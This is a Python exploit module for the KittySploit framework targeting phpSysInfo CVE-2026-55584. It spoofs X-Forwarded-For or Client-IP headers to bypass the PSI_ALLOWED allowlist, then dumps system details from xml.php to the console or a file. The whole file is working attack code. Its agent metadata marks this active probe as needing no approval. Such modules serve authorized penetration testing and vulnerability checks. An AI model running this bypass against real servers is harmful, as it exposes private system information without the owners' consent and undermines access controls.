#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.phpsysinfo import Phpsysinfo

_AFFECTED_VERSION = "3.4.5"


class Module(Auxiliary, Http_client, Phpsysinfo):

    __info__ = {
        "name": "phpSysInfo CVE-2026-55584 - PSI_ALLOWED IP allowlist bypass (info disclosure)",
        "description": (
            "CVE-2026-55584: phpSysInfo <= 3.4.5 resolves the client IP from attacker-controlled "
            "X-Forwarded-For or Client-IP before REMOTE_ADDR when enforcing PSI_ALLOWED. Spoofing an "
            "allowlisted address bypasses the restriction and exposes full system information via xml.php."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-55584"],
        "references": [
            "https://github.com/phpsysinfo/phpsysinfo/security/advisories/GHSA-786w-p5pm-cvgh",
            "https://www.cve.org/CVERecord?id=CVE-2026-55584",
        ],
        "tags": [
            "phpsysinfo",
            "disclosure",
            "allowlist",
            "bypass",
            "cve-2026-55584",
            "auxiliary",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals"],
        },
    }

    base_path = OptString("/", "phpSysInfo base URL path (e.g. /phpsysinfo)", required=False)
    spoof_ip = OptString(
        "",
        "Allowlisted IP to spoof (optional; common candidates are tried automatically)",
        required=False,
    )
    header_mode = OptString(
        "all",
        "Bypass header: all, x-forwarded-for, client-ip",
        required=False,
        advanced=True,
    )
    output_file = OptString("", "Optional file to write raw xml.php response", required=False)
    output_limit = OptInteger(
        4000,
        "Max characters of raw XML to print when output_file is empty (0 = full)",
        required=False,
        advanced=True,
    )

    def check(self):
        try:
            result = self.phpsysinfo_probe_allowlist_bypass(
                base_path=self.base_path,
                spoof_ip=self.spoof_ip,
                header_mode=self.header_mode,
                timeout=max(int(self.timeout or 10), 10),
            )
        except Exception as exc:
            return {"vulnerable": False, "reason": f"Check failed: {exc}", "confidence": "low"}

        status = result.get("status")
        version = str(result.get("version") or "")

        if status == "bypass":
            return {
                "vulnerable": True,
                "reason": result.get("reason"),
                "confidence": "high",
                "details": (
                    f"{result.get('header_name')}: {result.get('spoof_ip')} on {result.get('xml_path')}"
                ),
            }

        if status == "open":
            if version and self.phpsysinfo_version_lte(version, _AFFECTED_VERSION):
                return {
                    "vulnerable": True,
                    "reason": (
                        f"xml.php exposes system XML without allowlist denial "
                        f"(version {version} <= {_AFFECTED_VERSION})"
                    ),
                    "confidence": "medium",
                }
            return {
                "vulnerable": True,
                "reason": "xml.php exposes system XML without allowlist denial",
                "confidence": "medium",
            }

        if status == "denied":
            return {
                "vulnerable": False,
                "reason": result.get("reason"),
                "confidence": "medium",
            }

        return {
            "vulnerable": False,
            "reason": result.get("reason") or "phpSysInfo not detected",
            "confidence": "low",
        }

    def run(self):
        result = self.phpsysinfo_probe_allowlist_bypass(
            base_path=self.base_path,
            spoof_ip=self.spoof_ip,
            header_mode=self.header_mode,
            timeout=max(int(self.timeout or 10), 10),
        )

        status = result.get("status")
        body = str(result.get("body") or "")

        if status == "denied":
            print_error(result.get("reason") or "Allowlist bypass failed")
            print_status("Set SPOOF_IP to a value from PSI_ALLOWED if you know the allowlisted address")
            return False

        if status in ("not_phpsysinfo", "not_found", "error"):
            print_error(result.get("reason") or "Unable to retrieve phpSysInfo XML")
            return False

        if status == "bypass":
            print_success(
                f"Bypass via {result.get('header_name')}: {result.get('spoof_ip')} "
                f"({result.get('xml_path')})"
            )
        elif status == "open":
            print_warning("xml.php reachable without allowlist bypass")

        version = str(result.get("version") or "")
        if version:
            print_info(f"phpSysInfo version hint: {version}")

        rows = self.phpsysinfo_parse_xml_summary(body)
        if rows:
            print_table(["Field", "Value"], rows)
        else:
            limit = int(self.output_limit or 0)
            if limit > 0 and len(body) > limit:
                print_info(body[:limit] + "\n... [truncated]")
            else:
                print_info(body)

        out_path = str(self.output_file or "").strip()
        if out_path:
            try:
                with open(out_path, "w", encoding="utf-8", errors="ignore") as handle:
                    handle.write(body)
                print_success(f"Wrote {len(body)} bytes to {out_path}")
            except OSError as exc:
                print_error(f"Could not write output_file: {exc}")
                return False

        return True
